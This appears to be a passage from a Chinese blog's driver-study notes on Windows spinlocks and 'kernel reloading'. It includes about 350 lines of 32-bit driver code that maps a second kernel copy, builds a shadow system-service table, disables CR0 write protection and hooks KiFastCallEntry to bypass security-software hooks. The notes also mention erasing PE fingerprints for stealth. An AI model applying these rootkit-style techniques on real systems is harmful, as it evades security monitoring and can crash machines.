title="Windows自旋锁"></a>Windows自旋锁</h2><p>KeAcquireSpinLockAtDpcLevel</p><p>不满足的情况下，用pause自己转，这样就不用线程切换了。  </p><p>1、自旋锁只对多核有意义。<br>(查看不同版本的KeAcquireSpinLockAtDpcLevel函数)</p><p>2、自旋锁与临界区、事件、互斥体一样，都是一种同步机制，都可以让当前线程<br>处于等待状态，区别在于自旋锁不用切换线程。</p><h1 id="重载内核"><a href="#重载内核" class="headerlink" title="重载内核"></a>重载内核</h1><p>内核中的很多函数被层层HOOK，重载一份内核可以绕过这些HOOK。<br>重载内核的步骤   </p><p><1> 申请内存，按内存对齐展开</1></p><p><2> 根据重定位表修复全局变量</2></p><p><3> 修复IAT表(修复导入表的说法不准确)<br>因为导入表是别的模块的函数，不确定加载后别的模块在哪，通过名字找到之后，再把函数地址给IAT。<br>比如 call dword ptr ds：[0x12345678]，这是标准的CallIAT函数的汇编<br>IAT放入正确地址了么？</3></p><h2 id="重载以后："><a href="#重载以后：" class="headerlink" title="重载以后："></a>重载以后：</h2><p><1> 山寨系统服务表</1></p><p><2> 狸猫换太子(Hook KiFastCallEntry)</2></p><h2 id="重载内核的弊端"><a href="#重载内核的弊端" class="headerlink" title="重载内核的弊端"></a>重载内核的弊端</h2><p><1> 改动太大，即使抹去PE指纹也无法完全隐形。</1></p><p><2> 最好的办法不是重载内核，而是需要什么函数自己来实现。<br>代码如下</2></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ntifs.h&gt;</span><br><span class="line">#include &lt;ntimage.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma pack(1)</span><br><span class="line">typedef struct _ServiceDesriptorEntry</span><br><span class="line">&#123;</span><br><span class="line">ULONG *ServiceTableBase;        // 服务表基址</span><br><span class="line">ULONG *ServiceCounterTableBase; // 计数表基址</span><br><span class="line">ULONG NumberOfServices;         // 表中项的个数</span><br><span class="line">UCHAR *ParamTableBase;          // 参数表基址</span><br><span class="line">&#125;SSDTEntry, *PSSDTEntry;</span><br><span class="line"></span><br><span class="line">#pragma pack()</span><br><span class="line">// 导入SSDT,定义个全局变量</span><br><span class="line">NTSYSAPI SSDTEntry KeServiceDescriptorTable;</span><br><span class="line"></span><br><span class="line">PSSDTEntry pNewSSDT;</span><br><span class="line"></span><br><span class="line">PCHAR g_pHookpointer;</span><br><span class="line">PCHAR g_pJmpPointer;</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pDriver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE KernelCreateFile(</span><br><span class="line">IN PUNICODE_STRING pstrFile, // 文件路径符号链接</span><br><span class="line">IN BOOLEAN         bIsDir)   // 是否为文件夹</span><br><span class="line">&#123;</span><br><span class="line">HANDLE hFile = NULL;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">IO_STATUS_BLOCK StatusBlock = &#123; 0 &#125;;</span><br><span class="line">ULONG ulShareAccess=</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;</span><br><span class="line">ULONG uLCreateOpt= FILE_SYNCHRONOUS_IO_NONALERT;</span><br><span class="line">//1. 初始化OBJECT_ATTRIBUTES的内容</span><br><span class="line">OBJECT_ATTRIBUTES objAttrib = &#123; 0 &#125;;</span><br><span class="line">ULONG ulAttributes =</span><br><span class="line">OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;//不区分大小写|该句柄只能在内核模式下用</span><br><span class="line">InitializeObjectAttributes(</span><br><span class="line">&amp;objAttrib,    // 返回初始化完毕的结构体</span><br><span class="line">pstrFile,      // 文件对象名称</span><br><span class="line">ulAttributes,  // 对象属性</span><br><span class="line">NULL, NULL);   // 一般为NULL</span><br><span class="line">//2. 创建文件对象</span><br><span class="line">uLCreateOpt |= bIsDir ?</span><br><span class="line">FILE_DIRECTORY_FILE : FILE_NON_DIRECTORY_FILE;</span><br><span class="line">Status = ZwCreateFile(</span><br><span class="line">&amp;hFile,                // 返回文件句柄</span><br><span class="line">GENERIC_ALL,           // 文件操作描述</span><br><span class="line">&amp;objAttrib,            // OBJECT_ATTRIBUTES</span><br><span class="line">&amp;StatusBlock,          // 接受函数的操作结果</span><br><span class="line">0,                     // 初始文件大小</span><br><span class="line">FILE_ATTRIBUTE_NORMAL, // 新建文件的属性</span><br><span class="line">ulShareAccess,         // 文件共享方式</span><br><span class="line">FILE_OPEN_IF,          // 文件存在则打开不存在则创建</span><br><span class="line">uLCreateOpt,           // 打开操作的附加标志位</span><br><span class="line">NULL,                  // 扩展属性区</span><br><span class="line">0);                   // 扩展属性区长度</span><br><span class="line">if (!NT_SUCCESS(Status))</span><br><span class="line">return (HANDLE)-1;</span><br><span class="line">return hFile;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ULONG64 KernelGetFileSize(IN HANDLE hfile) </span><br><span class="line">&#123;</span><br><span class="line">// 查询文件状态</span><br><span class="line">IO_STATUS_BLOCK           StatusBlock = &#123; 0 &#125;;</span><br><span class="line">FILE_STANDARD_INFORMATION fsi = &#123; 0 &#125;;</span><br><span class="line">NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">Status = ZwQueryInformationFile(</span><br><span class="line">hfile,        // 文件句柄</span><br><span class="line">&amp;StatusBlock, // 接受函数的操作结果</span><br><span class="line">&amp;fsi,         // 根据最后一个参数的类型输出相关信息</span><br><span class="line">sizeof(FILE_STANDARD_INFORMATION),</span><br><span class="line">FileStandardInformation);</span><br><span class="line">if (!NT_SUCCESS(Status))</span><br><span class="line">return 0;</span><br><span class="line">return fsi.EndOfFile.QuadPart;</span><br><span class="line">&#125;</span><br><span class="line">ULONG64 KernelReadFile(</span><br><span class="line">IN  HANDLE         hfile,</span><br><span class="line">IN  PLARGE_INTEGER Offset,</span><br><span class="line">IN  ULONG          ulLength,</span><br><span class="line">OUT PVOID          pBuffer)</span><br><span class="line">&#123;</span><br><span class="line">// 1. 读取文件</span><br><span class="line">IO_STATUS_BLOCK StatusBlock = &#123; 0 &#125;;</span><br><span class="line">NTSTATUS        Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">Status = ZwReadFile(</span><br><span class="line">hfile,        // 文件句柄</span><br><span class="line">NULL,         // 信号状态(一般为NULL)</span><br><span class="line">NULL, NULL,   // 保留</span><br><span class="line">&amp;StatusBlock, // 接受函数的操作结果</span><br><span class="line">pBuffer,      // 保存读取数据的缓存</span><br><span class="line">ulLength,     // 想要读取的长度</span><br><span class="line">Offset,       // 读取的起始偏移</span><br><span class="line">NULL);        // 一般为NULL</span><br><span class="line">if (!NT_SUCCESS(Status))  return 0;</span><br><span class="line">// 2. 返回实际读取的长度</span><br><span class="line">return StatusBlock.Information;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY &#123;</span><br><span class="line">LIST_ENTRY InLoadOrderLinks;    //双向链表</span><br><span class="line">LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">PVOID DllBase;</span><br><span class="line">PVOID EntryPoint;</span><br><span class="line">ULONG SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">ULONG Flags;</span><br><span class="line">USHORT LoadCount;</span><br><span class="line">USHORT TlsIndex;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line">PVOID GetModuleBase(PDRIVER_OBJECT pDriver, PUNICODE_STRING pModuleName)</span><br><span class="line">&#123;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY pLdr =</span><br><span class="line">(PLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class="line">LIST_ENTRY *pTemp = &amp;pLdr-&gt;InLoadOrderLinks;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY pDriverInfo =</span><br><span class="line">(PLDR_DATA_TABLE_ENTRY)pTemp;</span><br><span class="line">KdPrint((&quot;%wZ\n&quot;, &amp;pDriverInfo-&gt;FullDllName));</span><br><span class="line">if (</span><br><span class="line">RtlCompareUnicodeString(pModuleName, &amp;pDriverInfo-&gt;BaseDllName, FALSE)</span><br><span class="line">== 0)</span><br><span class="line">&#123;</span><br><span class="line">return pDriverInfo-&gt;DllBase;</span><br><span class="line">&#125;</span><br><span class="line">pTemp = pTemp-&gt;Blink;</span><br><span class="line">&#125; while (pTemp != &amp;pLdr-&gt;InLoadOrderLinks);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//读取内核文件到内存，并且将其展开</span><br><span class="line">void GetReLoadBuf(PUNICODE_STRING KerPath, PCHAR* pReloadBuf)</span><br><span class="line">&#123;</span><br><span class="line">LARGE_INTEGER Offset = &#123; 0 &#125;;</span><br><span class="line">HANDLE hFile = KernelCreateFile(KerPath, FALSE);</span><br><span class="line">ULONG64 uSize = KernelGetFileSize(hFile);</span><br><span class="line">PCHAR pKernelBuf = ExAllocatePool(NonPagedPool, (SIZE_T)uSize);</span><br><span class="line">RtlZeroMemory(pKernelBuf, (SIZE_T)uSize);</span><br><span class="line">KernelReadFile(hFile,&amp;Offset, (ULONG)uSize, pKernelBuf);</span><br><span class="line">// 展开内核文件</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pKernelBuf;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pKernelBuf);</span><br><span class="line">PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line">*pReloadBuf = ExAllocatePool(NonPagedPool, pNt-&gt;OptionalHeader.SizeOfImage);//内存</span><br><span class="line">RtlZeroMemory(*pReloadBuf, pNt-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line">//2.1 先拷贝PE头部</span><br><span class="line">RtlCopyMemory(*pReloadBuf, pKernelBuf, pNt-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//2.2 再拷贝PE各个区段</span><br><span class="line">for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">RtlCopyMemory(</span><br><span class="line">*pReloadBuf + pSection[i].VirtualAddress,//内存的偏移</span><br><span class="line">pKernelBuf + pSection[i].PointerToRawData,//文件中的偏移</span><br><span class="line">pSection[i].SizeOfRawData</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">ExFreePool(pKernelBuf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void FixReloc(PCHAR OldKernelBase, PCHAR NewKernelBase)</span><br><span class="line">&#123;</span><br><span class="line">typedef struct _TYPEOFFSET</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">USHORT Offset : 12;</span><br><span class="line">USHORT type : 4;</span><br><span class="line">&#125;TYPEOFFSET, *PTYPEOFFSET;</span><br><span class="line">//1 找到重定位表</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)NewKernelBase;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + NewKernelBase);</span><br><span class="line"></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDir = (pNt-&gt;OptionalHeader.DataDirectory + 5);</span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(NewKernelBase+pDir-&gt;VirtualAddress);</span><br><span class="line">while (pReloc-&gt;SizeOfBlock != 0)</span><br><span class="line">&#123;</span><br><span class="line">//2 寻找重定位的位置</span><br><span class="line">ULONG uCount = (pReloc-&gt;SizeOfBlock - 8) / 2;</span><br><span class="line">PCHAR pSartAddress = (pReloc-&gt;VirtualAddress + NewKernelBase);</span><br><span class="line">PTYPEOFFSET pOffset = (PTYPEOFFSET)(pReloc + 1);</span><br><span class="line">for (ULONG i = 0; i &lt; uCount; i++)</span><br><span class="line">&#123;</span><br><span class="line">if (pOffset-&gt;type == 3)</span><br><span class="line">&#123;</span><br><span class="line">//3 开始重定位</span><br><span class="line">//NewBase-DefaultBase = NewReloc-DefaultReloc</span><br><span class="line">ULONG * pRelocAdd = (ULONG *)(pSartAddress + pOffset-&gt;Offset);</span><br><span class="line">*pRelocAdd += ((ULONG)OldKernelBase - pNt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">&#125;</span><br><span class="line">pOffset++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pReloc = (PIMAGE_BASE_RELOCATION)((PCHAR)pReloc + pReloc-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void FixSSDT(PCHAR OldKernelBase, PCHAR NewKernelBase)</span><br><span class="line">&#123;</span><br><span class="line">//新内核中的某位置 - NewKernelBase = 老内核中的此位置 - OldKernelBase</span><br><span class="line">//新内核中的某位置  = NewKernelBase-OldKernelBase+老内核中的此位置</span><br><span class="line">ULONG uOffset = (ULONG)NewKernelBase - (ULONG)OldKernelBase;</span><br><span class="line"></span><br><span class="line">pNewSSDT =</span><br><span class="line">(PSSDTEntry)((PCHAR)&amp;KeServiceDescriptorTable + uOffset);</span><br><span class="line">//填充SSDT函数数量</span><br><span class="line">pNewSSDT-&gt;NumberOfServices =</span><br><span class="line">KeServiceDescriptorTable.NumberOfServices;</span><br><span class="line">//填充SSDT函数地址表</span><br><span class="line">pNewSSDT-&gt;ServiceTableBase =</span><br><span class="line">(PULONG)((PCHAR)KeServiceDescriptorTable.ServiceTableBase + uOffset);</span><br><span class="line">for (ULONG i = 0; i &lt; pNewSSDT-&gt;NumberOfServices; i++)</span><br><span class="line">&#123;</span><br><span class="line">pNewSSDT-&gt;ServiceTableBase[i] = pNewSSDT-&gt;ServiceTableBase[i] + uOffset;</span><br><span class="line">&#125;</span><br><span class="line">//填充SSDT参数表，表中一个元素占1个字节</span><br><span class="line">pNewSSDT-&gt;ParamTableBase =</span><br><span class="line">((UCHAR*)KeServiceDescriptorTable.ParamTableBase + uOffset);</span><br><span class="line"></span><br><span class="line">memcpy(pNewSSDT-&gt;ParamTableBase, KeServiceDescriptorTable.ParamTableBase,</span><br><span class="line">KeServiceDescriptorTable.NumberOfServices);</span><br><span class="line"></span><br><span class="line">//填充SSDT调用次数表,表中一个元素占4个字节</span><br><span class="line">//pNewSSDT-&gt;ServiceCounterTableBase =</span><br><span class="line">//(PULONG)((PCHAR)KeServiceDescriptorTable.ServiceCounterTableBase + uOffset);</span><br><span class="line"></span><br><span class="line">//memcpy(pNewSSDT-&gt;ServiceCounterTableBase, </span><br><span class="line">//KeServiceDescriptorTable.ServiceCounterTableBase,</span><br><span class="line">//KeServiceDescriptorTable.NumberOfServices*4</span><br><span class="line">//);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void * SearchMemory(char * buf, int BufLenth, char * Mem, int MaxLenth)</span><br><span class="line">&#123;</span><br><span class="line">int MemIndex = 0;</span><br><span class="line">int BufIndex = 0;</span><br><span class="line">for (MemIndex = 0; MemIndex &lt; MaxLenth; MemIndex++)</span><br><span class="line">&#123;</span><br><span class="line">BufIndex = 0;</span><br><span class="line">if (Mem[MemIndex] == buf[BufIndex] || buf[BufIndex] == &apos;?&apos;)</span><br><span class="line">&#123;</span><br><span class="line">int MemIndexTemp = MemIndex;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">MemIndexTemp++;</span><br><span class="line">BufIndex++;</span><br><span class="line">&#125; while ((Mem[MemIndexTemp] == buf[BufIndex] || buf[BufIndex] == &apos;?&apos;) &amp;&amp; BufIndex &lt; BufLenth);</span><br><span class="line">if (BufIndex == BufLenth)</span><br><span class="line">&#123;</span><br><span class="line">return Mem + MemIndex;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PVOID GetKiFastCallEntryAddr()</span><br><span class="line">&#123;</span><br><span class="line">PVOID pAddr = 0;</span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">push ecx;</span><br><span class="line">push eax;</span><br><span class="line">mov ecx, 0x176;</span><br><span class="line">rdmsr;</span><br><span class="line">mov pAddr, eax;</span><br><span class="line">pop eax;</span><br><span class="line">pop ecx;</span><br><span class="line">&#125;</span><br><span class="line">return pAddr;</span><br><span class="line">&#125;</span><br><span class="line">void OffProtect()</span><br><span class="line">&#123;</span><br><span class="line">__asm &#123; //关闭内存保护</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">and eax, ~0x10000;</span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void OnProtect()</span><br><span class="line">&#123;</span><br><span class="line">__asm &#123; //开启内存保护</span><br><span class="line">push eax;</span><br><span class="line">mov eax, cr0;</span><br><span class="line">OR eax, 0x10000;</span><br><span class="line">mov cr0, eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">UCHAR CodeBuf[] = &#123; 0x2b, 0xe1, 0xc1, 0xe9, 0x02 &#125;;</span><br><span class="line">UCHAR NewCodeBuf[5] = &#123; 0xE9 &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void OnHookKiFastCall()</span><br><span class="line">&#123;</span><br><span class="line">//1 先得到KifastcallEntry的地址</span><br><span class="line">PVOID KiFastCallAdd = GetKiFastCallEntryAddr();</span><br><span class="line">//2 搜索2b e1 c1 e9 02</span><br><span class="line">g_pHookpointer = SearchMemory(CodeBuf, 5, KiFastCallAdd, 0x200);</span><br><span class="line">//3 找到这个位置之后，直接hook</span><br><span class="line">//3.1关闭页保护</span><br><span class="line">OffProtect();</span><br><span class="line">//3.2替换5个字节</span><br><span class="line">*(ULONG*)(NewCodeBuf + 1) =</span><br><span class="line">((ULONG)MyFilterFunction - (ULONG)g_pHookpointer - 5);</span><br><span class="line">memcpy(g_pHookpointer, NewCodeBuf, 5);</span><br><span class="line"></span><br><span class="line">//3.3开启页保护</span><br><span class="line">OnProtect();</span><br><span class="line">g_pJmpPointer = g_pHookpointer + 5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPath) &#123;</span><br><span class="line">UNREFERENCED_PARAMETER(pPath);</span><br><span class="line">DbgBreakPoint();</span><br><span class="line">PCHAR pNtModuleBase = NULL;</span><br><span class="line">UNICODE_STRING pNtModuleName;</span><br><span class="line">//1.找到内核文件，并将其展开</span><br><span class="line">//初始化字符串</span><br><span class="line">PCHAR pReloadBuf = NULL;</span><br><span class="line">UNICODE_STRING KerPath;</span><br><span class="line">RtlInitUnicodeString(&amp;KerPath, L&quot;\\??\\C:\\windows\\system32\\ntkrnlpa.exe&quot;);</span><br><span class="line"></span><br><span class="line">GetReLoadBuf(&amp;KerPath, &amp;pReloadBuf);</span><br><span class="line">//2 修复重定位ntoskrnl.exe</span><br><span class="line">RtlInitUnicodeString(&amp;pNtModuleName, L&quot;ntoskrnl.exe&quot;);</span><br><span class="line">pNtModuleBase = (PCHAR)GetModuleBase(pDriver, &amp;pNtModuleName);</span><br><span class="line">FixReloc(pNtModuleBase, pReloadBuf);</span><br><span class="line">//3 修复自己的SSDT表</span><br><span class="line">FixSSDT(pNtModuleBase, pReloadBuf);</span><br><span class="line"></span><br><span class="line">//4 Hook KiFastCallEntry，拦截系统调用</span><br><span class="line">OnHookKiFastCall();</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 驱动笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 驱动 </tag>
            
            <tag> 内核重载 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>驱动学习笔记上</title>
      <link href="/2018/07/02/%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/"/>
      <url>/2018/07/02/%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/</url>
